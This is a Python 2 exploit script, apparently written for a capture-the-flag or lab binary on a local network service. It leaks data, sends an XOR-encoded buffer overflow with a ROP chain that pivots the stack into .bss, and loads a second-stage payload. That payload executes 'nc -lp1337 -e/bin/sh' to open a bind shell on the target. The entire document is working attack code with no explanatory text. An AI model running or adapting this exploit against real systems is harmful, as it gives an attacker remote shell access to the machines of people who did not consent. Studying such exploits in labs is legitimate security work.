#!/usr/bin/env python
import socket
from struct import *
import time

TCP_IP = '10.0.0.1'
TCP_PORT = 20002
BUFFER_SIZE = 1024
BUFFER_SIZE2 = 4 * 32 # 4 * uint
BUFFER_SIZE3 = 32*4096 + 16 + 4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
print "received data:", data
data = s.recv(BUFFER_SIZE)
#print "received data:", data

s.send("E")
s.send(pack("<I", BUFFER_SIZE2))
s.send("A"*(BUFFER_SIZE2))
data = s.recv(BUFFER_SIZE)
print "received data:", data
data = s.recv(BUFFER_SIZE)

#0x804b420->0x804b500 at 0x00002418: .bss ALLOC
#$5 = {ssize_t (int, void *, size_t)} 0x804952d <nread>

rop  = pack("<L", 0x08048b13) #0x08048b13 : pop ebp ; ret
rop += pack("<L", 0x0804b420) # new stack pointer to .bss
rop += pack("<L", 0x0804952d) # nread pointer 
rop += pack("<L", 0x08048b41) # leave ret
rop += pack("<L", 0) # fd = socket
rop += pack("<L", 0x0804b420) # .bss segment
rop += pack("<L", 100) # size_t

bof = "A"*(BUFFER_SIZE3-4)+rop
bof = list(bof)
for i in range(0,len(bof)):
	 bof[i] = chr(ord(data[i%128+5])^ord("A")^ord(bof[i]))
bof = ''.join(bof)

payload2  = pack("<L", 0x41414141)
payload2 += pack("<L", 0x080489b0) # new stack from here! - execve jmp
payload2 += pack("<L", 0x08048960) # exit jmp
payload2 += pack("<L", 0x0804b438) # .bss starts with the string ???
payload2 += pack("<L", 0x0804b444) # command variable ???
payload2 += pack("<L", 0x0)

payload2 += "/usr/bin/nc\x00" # binary location string - 0x0804b438
payload2 += pack("<L", 0x0804b438) # command[0] pointer - 0x0804b444
payload2 += pack("<L", 0x0804b454) # command[1] pointer - 0x0804b448
payload2 += pack("<L", 0x0804b45c) # command[2] pointer - 0x0804b44c
payload2 += pack("<L", 0x0)
payload2 += "-lp1337\x00-e/bin/sh\x00"

payload2 += "A"*(100-len(payload2))

s.send("E")
s.send(pack("<I", len(bof)))
print s.send(bof+"Q"+payload2)
while True:
	data = s.recv(BUFFER_SIZE)
	if not data:
		break
s.close()

